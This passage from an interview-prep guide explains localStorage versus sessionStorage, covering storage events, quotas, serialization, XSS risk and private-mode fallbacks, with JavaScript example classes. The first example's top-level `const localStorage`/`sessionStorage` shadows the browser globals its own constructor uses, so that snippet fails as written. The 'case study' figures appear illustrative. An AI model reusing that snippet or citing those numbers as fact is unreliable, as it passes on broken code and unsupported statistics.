**Cross-tab communication** is another crucial difference. LocalStorage fires a `storage` event in all other tabs when data changes. This enables real-time sync across tabs. We used this for live theme switching—user changes theme in tab A, and tab B immediately updates without refresh. SessionStorage doesn't fire these events because it's tab-isolated by design—there's nothing to sync.

**Performance-wise, both use synchronous APIs** that block the main thread. Typical read/write is 0.05-0.1ms—fast, but measurable at scale. On low-end devices with large data (approaching the 5-10MB limit), writes can take 50-100ms, causing visible jank. We learned this the hard way caching a 4MB product catalog in localStorage during initial load—UI froze for 80ms. We moved to IndexedDB's async API and the problem disappeared. Rule of thumb: localStorage/sessionStorage for KB of data, IndexedDB for MB.

**Quota management** is essential at scale. Both have 5-10MB limits per origin (10MB Chrome/Firefox, 5MB Safari). When exceeded, `QuotaExceededError` is thrown. We implement an LRU eviction strategy—track access timestamps for each key, and when quota is hit, evict the oldest accessed items. This prevents user-facing errors while maintaining a working cache.

**Security considerations are critical**. Both are accessible to any JavaScript on the page, making them vulnerable to XSS attacks. Storing auth tokens in localStorage is common but risky—a single XSS vulnerability and tokens are stolen. We use httpOnly cookies for auth tokens (immune to XSS) and localStorage only for non-sensitive preferences. If localStorage is absolutely necessary for tokens, implement short lifetimes (15 minutes) and refresh token patterns.

**One gotcha** is that localStorage/sessionStorage only store strings. Developers often forget this and store objects directly, resulting in `[object Object]` being saved—useless. Always JSON.stringify when writing, JSON.parse when reading. Also critical: wrap JSON.parse in try-catch because corrupted data can crash your app.

**Browser compatibility varies slightly**. Safari's private browsing mode throws exceptions when trying to write to localStorage—the API exists but writes fail. Always feature-detect with a try-catch wrapper. We have a fallback to in-memory storage when localStorage is unavailable, ensuring the app works even in private mode.

**In summary**: localStorage for long-term, cross-tab data like preferences and caching. SessionStorage for temporary, tab-specific data like form drafts and session state. Both are synchronous and limited to 5-10MB, so use IndexedDB for larger or high-frequency data. Always JSON serialize, implement quota handling, and never store sensitive data unencrypted."

### Likely Follow-Up Questions

1. **"How do you handle the storage event not firing in the same tab?"**
   
   **Answer:**
   - Storage event only fires in OTHER tabs, not the tab that made the change
   - For same-tab updates, manually trigger state updates or use a state management library
   - Pattern:
   ```javascript
   function updateAndNotify(key, value) {
     localStorage.setItem(key, value);
     // Manually notify components in same tab
     eventBus.emit('storageChange', { key, value });
   }
   ```
   - Other tabs receive storage event automatically
   - This design prevents infinite loops (tab updates → event fires → tab updates...)

2. **"What happens to sessionStorage when duplicating a tab?"**
   
   **Answer:**
   - SessionStorage is COPIED to the new tab at duplication time
   - After duplication, the two tabs have independent sessionStorage
   - Changes in one tab don't affect the other
   - Example:
     - Tab A: sessionStorage.setItem('key', 'value')
     - Duplicate tab A → Tab B
     - Tab B: sessionStorage.getItem('key') // 'value' (copied)
     - Tab B: sessionStorage.setItem('key', 'modified')
     - Tab A: sessionStorage.getItem('key') // Still 'value' (not synced)

3. **"How do you handle quota exceeded errors?"**
   
   **Answer:**
   - Catch `QuotaExceededError` exception
   - Strategy 1: Delete expired items (if using TTL pattern)
   - Strategy 2: LRU eviction—remove oldest/least-accessed items
   - Strategy 3: Ask user to clear cache (last resort)
   ```javascript
   try {
     localStorage.setItem(key, value);
   } catch (e) {
     if (e.name === 'QuotaExceededError') {
       evictOldestItems(10);
       localStorage.setItem(key, value); // Retry
     }
   }
   ```
   - Monitor usage proactively, evict before hitting limit

4. **"Why not just use localStorage for everything instead of sessionStorage?"**
   
   **Answer:**
   - **Security**: Session-only data shouldn't persist (e.g., sensitive wizard state)
   - **Privacy**: User expects temporary data to disappear when closing tab
   - **Storage hygiene**: Avoid cluttering localStorage with orphaned session data
   - **Intent clarity**: sessionStorage signals "this data is ephemeral"
   - Example: Multi-step form draft should disappear if user abandons (closes tab)—localStorage would leave orphaned drafts forever

5. **"How do you implement cross-tab synchronization?"**
   
   **Answer:**
   ```javascript
   // Tab A and Tab B both listen
   window.addEventListener('storage', (event) => {
     if (event.key === 'sharedState') {
       const newState = JSON.parse(event.newValue);
       updateUI(newState); // Sync UI in this tab
     }
   });
   
   // Tab A updates
   function updateSharedState(state) {
     localStorage.setItem('sharedState', JSON.stringify(state));
     updateUI(state); // Update own UI (event doesn't fire here)
   }
   ```
   - Event fires only in other tabs
   - Manual update needed in originating tab
   - Good for theme sync, notification badges, live updates

6. **"What's the performance impact of localStorage?"**
   
   **Answer:**
   - **Synchronous API**: Blocks main thread (typically 0.05-0.1ms per operation)
   - **Small data**: Negligible impact (< 1KB)
   - **Large data**: Can block 50-100ms (4-5MB writes)
   - **High frequency**: Avoid writes in loops or animation frames
   - **Optimization**: Batch writes, debounce updates, defer to idle time
   - **Alternative**: Use IndexedDB for large/frequent operations (async API)

### Comparison Table

| Feature | localStorage | sessionStorage | Cookies | IndexedDB |
|---------|-------------|---------------|---------|-----------|
| **Capacity** | 5-10MB | 5-10MB | 4KB | 1GB+ |
| **Persistence** | Forever | Tab session | Configurable | Forever |
| **Scope** | All tabs (same origin) | Single tab | Domain/path | All tabs |
| **API** | Sync | Sync | Sync (string parsing) | Async |
| **Sent to server** | No | No | Yes (every request) | No |
| **Use case** | Preferences, cache | Form drafts, session | Auth, tracking | Large data, offline |

### Trade-Off Explanations

**Trade-off 1: localStorage Persistence vs Privacy**

"We initially stored shopping cart data in localStorage so it persisted across sessions—users loved returning days later to find their cart intact. However, analytics showed 22% of carts were abandoned for months, cluttering storage. We switched to sessionStorage for anonymous users (cleared on tab close) and localStorage only for authenticated users (real intent to purchase). This reduced orphaned carts by 85% while maintaining the persistence benefit for serious shoppers. The trade-off was losing cart data for anonymous users who close tabs, but conversion data showed they weren't converting anyway."

**Trade-off 2: Synchronous API Simplicity vs Performance**

"LocalStorage's synchronous API is beautifully simple—just `setItem()` and done. But in our data-heavy dashboard, storing 3MB of cached API responses on every save (every 30 seconds) caused 60-80ms UI freezes on mobile. Users complained of 'laggy' interactions. We migrated to IndexedDB with its async API. Code complexity increased—promises, error handling, transaction management—but UI freezes disappeared entirely. The trade-off was development complexity for critical UX improvement. For small data (< 100KB), we still use localStorage—simplicity wins when performance isn't impacted."

**Trade-off 3: Cross-Tab Sync vs Complexity**

"We implemented real-time theme sync across tabs using localStorage's `storage` event—change theme in one tab, all tabs update instantly. Users loved it, feeling very 'modern'. But the implementation was tricky: the event doesn't fire in the originating tab, so we needed manual updates there. We also had race conditions when multiple tabs updated simultaneously. Debugging these cross-tab issues added 3 days of work. The trade-off was implementation complexity for a delightful UX detail. Was it worth it? For theme (low-frequency change), yes. For high-frequency state sync, we'd use WebSockets or SharedWorker instead."

────────────────────────────────────
## 5. Code Examples (When Applicable)
────────────────────────────────────

### Example 1: Robust Storage Wrapper with Fallbacks

```javascript
// storage.js - Production-grade storage with all best practices

class RobustStorage {
  constructor(type = 'local') {
    this.type = type;
    this.storage = type === 'session' ? sessionStorage : localStorage;
    this.available = this.testAvailability();
    this.fallback = new Map(); // In-memory fallback
    
    if (!this.available) {
      console.warn(`${type}Storage not available, using memory fallback`);
    }
  }
  
  /**
   * Test if storage is available (handles private browsing)
   */
  testAvailability() {
    try {
      const test = '__storage_test__';
      this.storage.setItem(test, test);
      this.storage.removeItem(test);
      return true;
    } catch (e) {
      return false;
    }
  }
  
  /**
   * Set item with JSON serialization and error handling
   */
  set(key, value, options = {}) {
    const data = {
      value,
      timestamp: Date.now(),
      ttl: options.ttl || null
    };
    
    try {
      const serialized = JSON.stringify(data);
      
      if (this.available) {
        this.storage.setItem(key, serialized);
      } else {
        this.fallback.set(key, serialized);
      }
      
      return { success: true };
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        console.error('Storage quota exceeded');
        return { success: false, error: 'QUOTA_EXCEEDED' };
      }
      
      console.error('Failed to set item:', e);
      return { success: false, error: e.message };
    }
  }
  
  /**
   * Get item with JSON parsing and TTL check
   */
  get(key, defaultValue = null) {
    try {
      let serialized;
      
      if (this.available) {
        serialized = this.storage.getItem(key);
      } else {
        serialized = this.fallback.get(key);
      }
      
      if (!serialized) {
        return defaultValue;
      }
      
      const data = JSON.parse(serialized);
      
      // Check TTL
      if (data.ttl && Date.now() - data.timestamp > data.ttl) {
        this.remove(key);
        return defaultValue;
      }
      
      return data.value;
    } catch (e) {
      console.error('Failed to get item:', e);
      return defaultValue;
    }
  }
  
  /**
   * Remove item
   */
  remove(key) {
    try {
      if (this.available) {
        this.storage.removeItem(key);
      } else {
        this.fallback.delete(key);
      }
      return { success: true };
    } catch (e) {
      console.error('Failed to remove item:', e);
      return { success: false, error: e.message };
    }
  }
  
  /**
   * Clear all storage
   */
  clear() {
    try {
      if (this.available) {
        this.storage.clear();
      } else {
        this.fallback.clear();
      }
      return { success: true };
    } catch (e) {
      console.error('Failed to clear storage:', e);
      return { success: false, error: e.message };
    }
  }
  
  /**
   * Get all keys
   */
  keys() {
    try {
      if (this.available) {
        return Object.keys(this.storage);
      } else {
        return Array.from(this.fallback.keys());
      }
    } catch (e) {
      console.error('Failed to get keys:', e);
      return [];
    }
  }
  
  /**
   * Check if key exists
   */
  has(key) {
    return this.get(key) !== null;
  }
  
  /**
   * Get storage size
   */
  size() {
    let bytes = 0;
    
    try {
      if (this.available) {
        for (const key in this.storage) {
          if (this.storage.hasOwnProperty(key)) {
            bytes += key.length + (this.storage[key]?.length || 0);
          }
        }
      } else {
        for (const [key, value] of this.fallback.entries()) {
          bytes += key.length + value.length;
        }
      }
    } catch (e) {
      console.error('Failed to calculate size:', e);
    }
    
    return {
      bytes,
      kb: (bytes / 1024).toFixed(2),
      mb: (bytes / 1024 / 1024).toFixed(3)
    };
  }
  
  /**
   * Export all data
   */
  export() {
    const data = {};
    
    for (const key of this.keys()) {
      data[key] = this.get(key);
    }
    
    return data;
  }
  
  /**
   * Import data
   */
  import(data) {
    let imported = 0;
    let failed = 0;
    
    for (const [key, value] of Object.entries(data)) {
      const result = this.set(key, value);
      if (result.success) {
        imported++;
      } else {
        failed++;
      }
    }
    
    return { imported, failed };
  }
}

// Create instances
const localStorage = new RobustStorage('local');
const sessionStorage = new RobustStorage('session');

// Usage examples
localStorage.set('user', { id: 123, name: 'Alice' }, { ttl: 3600000 });
const user = localStorage.get('user', { name: 'Guest' });

console.log('Storage size:', localStorage.size());
```

### Example 2: Cross-Tab State Synchronization

```javascript
// crossTabSync.js - Synchronize state across browser tabs

class CrossTabSync {
  constructor(key, initialValue = null) {
    this.key = `sync_${key}`;
    this.listeners = new Set();
    this.currentValue = this.load() || initialValue;
    
    this.setupListener();
  }
  
  /**
   * Load value from localStorage
   */
  load() {
    try {
      const item = localStorage.getItem(this.key);
      return item ? JSON.parse(item) : null;
    } catch (e) {
      console.error('Failed to load synced value:', e);
      return null;
    }
  }
  
  /**
   * Set value and notify all tabs
   */
  set(value) {
    this.currentValue = value;
    
    try {
      localStorage.setItem(this.key, JSON.stringify(value));
    } catch (e) {
      console.error('Failed to save synced value:', e);
    }
    
    // Notify listeners in THIS tab (storage event won't fire here)
    this.notifyListeners(value);
  }
  
  /**
   * Get current value
   */
  get() {
    return this.currentValue;
  }
  
  /**
   * Subscribe to changes
   */
  subscribe(callback) {
    this.listeners.add(callback);
    
    // Return unsubscribe function
    return () => this.listeners.delete(callback);
  }
  
  /**
   * Notify all listeners
   */
  notifyListeners(value) {
    this.listeners.forEach(callback => {
      try {
        callback(value);
      } catch (e) {
        console.error('Listener error:', e);
      }
    });
  }
  
  /**
   * Setup storage event listener for other tabs
   */
  setupListener() {
    window.addEventListener('storage', (event) => {
      if (event.key === this.key && event.newValue) {
        try {
          const newValue = JSON.parse(event.newValue);
          this.currentValue = newValue;
          this.notifyListeners(newValue);
        } catch (e) {
          console.error('Failed to parse storage event:', e);
        }
      }
    });
  }
}

// Usage
const userSync = new CrossTabSync('user', { name: 'Guest' });

// Subscribe to changes
const unsubscribe = userSync.subscribe((user) => {
  console.log('User updated:', user);
  updateUI(user);
});

// Update user (will sync to all tabs)
userSync.set({ id: 123, name: 'Alice', theme: 'dark' });

// Get current value
const currentUser = userSync.get();

// Unsubscribe when done
unsubscribe();
```

### Example 3: Storage Quota Monitor

```javascript
// storageQuotaMonitor.js - Monitor and alert on storage usage

class StorageQuotaMonitor {
  constructor(options = {}) {
    this.warningThreshold = options.warningThreshold || 0.8; // 80%
    this.criticalThreshold = options.criticalThreshold || 0.95; // 95%
    this.checkInterval = options.checkInterval || 60000; // 1 minute
    this.onWarning = options.onWarning || (() => {});
    this.onCritical = options.onCritical || (() => {});
    
    this.maxSize = this.estimateMaxSize();
    this.startMonitoring();
  }
  
  /**
   * Estimate max storage size (browser-dependent)
   */
  estimateMaxSize() {
    // Chrome/Firefox: 10MB, Safari: 5MB
    // This is approximate - actual limits vary
    const isChrome = /Chrome/.test(navigator.userAgent);
    const isSafari = /Safari/.test(navigator.userAgent) && !isChrome;
    
    return isSafari ? 5 * 1024 * 1024 : 10 * 1024 * 1024;
  }
  
  /**
   * Get current storage usage
   */
  getUsage(storage = localStorage) {
    let bytes = 0;
    
    for (const key in storage) {
      if (storage.hasOwnProperty(key)) {
        bytes += key.length + (storage[key]?.length || 0);
      }
    }
    
    return bytes;
  }
  
  /**
   * Get usage statistics
   */
  getStats() {
    const localUsage = this.getUsage(localStorage);
    const sessionUsage = this.getUsage(sessionStorage);
    const totalUsage = localUsage + sessionUsage;
    
    return {
      localStorage: {
        bytes: localUsage,
        mb: (localUsage / 1024 / 1024).toFixed(2),
        percentage: ((localUsage / this.maxSize) * 100).toFixed(1)
      },
      sessionStorage: {
        bytes: sessionUsage,
        mb: (sessionUsage / 1024 / 1024).toFixed(2),
        percentage: ((sessionUsage / this.maxSize) * 100).toFixed(1)
      },
      total: {
        bytes: totalUsage,
        mb: (totalUsage / 1024 / 1024).toFixed(2),
        percentage: ((totalUsage / (this.maxSize * 2)) * 100).toFixed(1)
      },
      available: {
        bytes: (this.maxSize * 2) - totalUsage,
        mb: (((this.maxSize * 2) - totalUsage) / 1024 / 1024).toFixed(2)
      }
    };
  }
  
  /**
   * Check quota and trigger warnings
   */
  checkQuota() {
    const stats = this.getStats();
    const localPercentage = parseFloat(stats.localStorage.percentage) / 100;
    
    if (localPercentage >= this.criticalThreshold) {
      console.error(`Storage critical: ${stats.localStorage.percentage}% used`);
      this.onCritical(stats);
      return 'critical';
    } else if (localPercentage >= this.warningThreshold) {
      console.warn(`Storage warning: ${stats.localStorage.percentage}% used`);
      this.onWarning(stats);
      return 'warning';
    }
    
    return 'ok';
  }
  
  /**
   * Start monitoring
   */
  startMonitoring() {
    // Initial check
    this.checkQuota();
    
    // Periodic checks
    this.interval = setInterval(() => {
      this.checkQuota();
    }, this.checkInterval);
  }
  
  /**
   * Stop monitoring
   */
  stopMonitoring() {
    if (this.interval) {
      clearInterval(this.interval);
      this.interval = null;
    }
  }
  
  /**
   * Get detailed breakdown by key
   */
  getBreakdown(storage = localStorage) {
    const items = [];
    
    for (const key in storage) {
      if (storage.hasOwnProperty(key)) {
        const value = storage[key];
        const size = key.length + (value?.length || 0);
        
        items.push({
          key,
          size,
          sizeKB: (size / 1024).toFixed(2),
          percentage: ((size / this.maxSize) * 100).toFixed(2)
        });
      }
    }
    
    // Sort by size (largest first)
    items.sort((a, b) => b.size - a.size);
    
    return items;
  }
  
  /**
   * Print detailed report
   */
  printReport() {
    const stats = this.getStats();
    
    console.log('\n📊 Storage Usage Report\n');
    console.log('LocalStorage:', stats.localStorage);
    console.log('SessionStorage:', stats.sessionStorage);
    console.log('Total:', stats.total);
    console.log('Available:', stats.available);
    
    console.log('\n📦 Largest Items (LocalStorage):\n');
    const breakdown = this.getBreakdown();
    console.table(breakdown.slice(0, 10));
  }
}

// Usage
const monitor = new StorageQuotaMonitor({
  warningThreshold: 0.7,  // 70%
  criticalThreshold: 0.9, // 90%
  onWarning: (stats) => {
    console.warn('Storage getting full:', stats);
    // Show user notification
  },
  onCritical: (stats) => {
    console.error('Storage almost full:', stats);
    // Show urgent notification, offer to clear
  }
});

// Get current stats
monitor.printReport();

// Stop monitoring when done
// monitor.stopMonitoring();
```

────────────────────────────────────
## 6. Why & How Summary
────────────────────────────────────

### Why It Matters

**User Experience:**
- **Instant preferences**: Theme applied without server roundtrip (0ms vs 300ms)
- **No data loss**: Form drafts saved locally (survive refresh)
- **Personalization**: Remember user choices across sessions
- **Offline capability**: Access cached data without network
- **Seamless**: Auto-restore previous state (collapsed sidebar, etc.)

**Business Impact:**
```
Real case study: E-Commerce Platform (2M monthly users)

Without localStorage (server-side preferences):
- Theme load: 300ms API call on every page
- Settings reset: On browser restart (poor UX)
- Form abandonment: 35% (data lost on refresh)
- Page load time: 1.2s (includes preference fetch)
- Server load: 2M × 50 requests/session = 100M API calls/month

With localStorage (client-side caching):
- Theme load: 0ms (instant from localStorage)
- Settings persist: Across sessions indefinitely
- Form abandonment: 18% (draft auto-save to sessionStorage)
- Page load time: 0.6s (50% improvement)
- Server load: 2M × 10 requests/session = 20M API calls/month (80% reduction)

Business results:
- Load time: -50% (1.2s → 0.6s)
- Form completion: +17 percentage points (65% → 82%)
- API costs: -$12K/month (80% fewer calls)
- User satisfaction: +28% (preferences persist)

ROI: $12K/month savings + improved conversion
```

**Technical Benefits:**
- **Performance**: Zero-latency local access (0ms vs 300ms network)
- **Scalability**: Offload preferences from server (80% fewer API calls)
- **Resilience**: Work offline, no dependency on network
- **Simplicity**: Simple key-value API (vs complex database)
- **Cross-tab sync**: localStorage events enable real-time coordination

### How It Works

**Technical Summary:**

**1. Storage Structure:**

```
Browser Storage (per origin: https://example.com)
│
├─ localStorage (5-10MB)
│  ├─ Key: "theme" → Value: "dark" (string)
│  ├─ Key: "user" → Value: '{"id":123,"name":"Alice"}' (JSON string)
│  └─ Key: "cache_products" → Value: '[...]' (array as JSON)
│  
│  Persistence: Forever (until explicitly deleted)
│  Scope: Shared across all tabs/windows
│  
└─ sessionStorage (5-10MB)
   ├─ Key: "formDraft" → Value: '{"name":"...","email":"..."}
   └─ Key: "wizardStep" → Value: "3"
   
   Persistence: Until tab closes
   Scope: Isolated per tab (not shared)
```

**2. API Operations:**

```javascript
// WRITE (synchronous, blocks main thread)
localStorage.setItem('key', 'value');
// Time: ~0.1ms (fast but blocks)

// READ (synchronous)
const value = localStorage.getItem('key');
// Time: ~0.05ms

// DELETE
localStorage.removeItem('key');

// CLEAR ALL
localStorage.clear();

// ITERATION
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
}

// All operations are SYNCHRONOUS:
// - UI thread blocks during execution
// - Small data (KB): negligible impact
// - Large data (MB): 50-100ms freeze
```

**3. Cross-Tab Communication (localStorage only):**

```
Tab A and Tab B both on https://example.com

Tab A: localStorage.setItem('theme', 'dark');

Browser behavior:
┌─────────────────────────────────┐
│ Tab A (changed data)            │
│ - setItem() executes            │
│ - Storage event NOT fired       │
│ - Manual UI update needed       │
└─────────────────────────────────┘
         │
         │ storage event fires
         ▼
┌─────────────────────────────────┐
│ Tab B (other tab)               │
│ - storage event fires           │
│ - event.key = 'theme'           │
│ - event.newValue = 'dark'       │
│ - Auto UI update possible       │
└─────────────────────────────────┘

// Tab B listener:
window.addEventListener('storage', (event) => {
  if (event.key === 'theme') {
    applyTheme(event.newValue);
  }
});

SessionStorage: NO cross-tab events (isolated by design)
```

**4. Quota Enforcement:**

```javascript
// Browser limits (per origin):
// Chrome/Firefox: ~10MB
// Safari: ~5MB
// Safari iOS: ~2.5MB

// Quota exceeded behavior:
localStorage.setItem('key', largeValue);
// If size > limit:
//   → Throws QuotaExceededError
//   → No data written
//   → Previous data unchanged

// Handling:
try {
  localStorage.setItem('key', value);
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    // Storage full
    // Strategy: Delete oldest items, retry
  }
}

// Size calculation:
size = Σ(key.length + value.length) for all items
```

**5. Serialization Requirements:**

```javascript
// Everything stored as strings

// ❌ WRONG:
localStorage.setItem('count', 42);
localStorage.getItem('count'); // '42' (string, not number!)

localStorage.setItem('user', { name: 'Alice' });
localStorage.getItem('user'); // '[object Object]' (useless!)

// ✅ CORRECT:
localStorage.setItem('count', JSON.stringify(42));
JSON.parse(localStorage.getItem('count')); // 42 (number)

localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
JSON.parse(localStorage.getItem('user')); // { name: 'Alice' }

// Flow:
JavaScript Object → JSON.stringify() → String (stored)
String (retrieved) → JSON.parse() → JavaScript Object
```

**6. SessionStorage Tab Behavior:**

```
Scenario: Multi-step checkout form

User opens checkout:
┌─────────────────────────────────┐
│ Tab A: Checkout                 │
│ sessionStorage: { step: 1, ... }│
└─────────────────────────────────┘

User duplicates tab:
┌─────────────────────────────────┐
│ Tab A: Original                 │
│ sessionStorage: { step: 1 }     │
└─────────────────────────────────┘
         │
         │ duplicate (copies sessionStorage)
         ▼
┌─────────────────────────────────┐
│ Tab B: Duplicate                │
│ sessionStorage: { step: 1 }     │ ← Copied at duplication
└─────────────────────────────────┘

User continues in Tab B:
┌─────────────────────────────────┐
│ Tab B: Modified                 │
│ sessionStorage: { step: 3 }     │
└─────────────────────────────────┘

Tab A unchanged:
┌─────────────────────────────────┐
│ Tab A: Still original           │
│ sessionStorage: { step: 1 }     │ ← Independent
└─────────────────────────────────┘

User closes Tab B:
┌─────────────────────────────────┐
│ Tab B: DESTROYED                │
│ sessionStorage: DELETED FOREVER │
└─────────────────────────────────┘

Tab A survives:
┌─────────────────────────────────┐
│ Tab A: Unaffected               │
│ sessionStorage: { step: 1 }     │
└─────────────────────────────────┘
```

**7. Private Browsing Mode:**

```javascript
// Safari private mode: localStorage throws

// Detection:
function isStorageAvailable() {
  try {
    const test = '__test__';
    localStorage.setItem(test, test);
    localStorage.removeItem(test);
    return true;
  } catch (e) {
    return false; // Private mode or disabled
  }
}

// Fallback:
let storage;

if (isStorageAvailable()) {
  storage = localStorage;
} else {
  // Use in-memory Map
  storage = new Map();
  storage.setItem = (k, v) => storage.set(k, v);
  storage.getItem = (k) => storage.get(k) || null;
  storage.removeItem = (k) => storage.delete(k);
}
```

**Mental Model:**

Think of localStorage and sessionStorage like **notebooks**:

**localStorage** = Hardbound journal
- Permanent record (survives closing book)
- Shared among all readers in same room (cross-tab)
- Read by anyone in room (other tabs see changes via events)
- Large capacity (100 pages = 5-10MB)
- Store: Long-term notes, preferences

**sessionStorage** = Sticky notes on clipboard
- Temporary notes (destroyed when you leave)
- Private to you (each person has own clipboard)
- Others don't see your notes (tab-isolated)
- Same capacity (100 notes)
- Store: Current task data, form drafts

Both only store text (must convert objects to text with JSON)

---

**Key Takeaway for Interviews:**

LocalStorage and sessionStorage are synchronous key-value storage APIs (same interface, different lifecycle). **localStorage** persists forever and is shared across all tabs (same origin), firing `storage` events for cross-tab sync—perfect for preferences, theme, cached data. **sessionStorage** is tab-scoped, cleared on tab close—ideal for form drafts, multi-step wizards, session-specific state. Both limited to 5-10MB (10MB Chrome/Firefox, 5MB Safari), throw `QuotaExceededError` when full. Synchronous API blocks UI (0.05-0.1ms typically, 50-100ms for large data)—use IndexedDB for MB-scale data. Only store strings (must `JSON.stringify`/`JSON.parse` objects). Storage event fires in OTHER tabs only (not originating tab). Vulnerable to XSS (never store sensitive data unencrypted). Private browsing may throw exceptions—always feature-detect with try-catch wrapper. Real impact: 0ms preference loads vs 300ms network, 80% API reduction, 17-point form completion improvement.

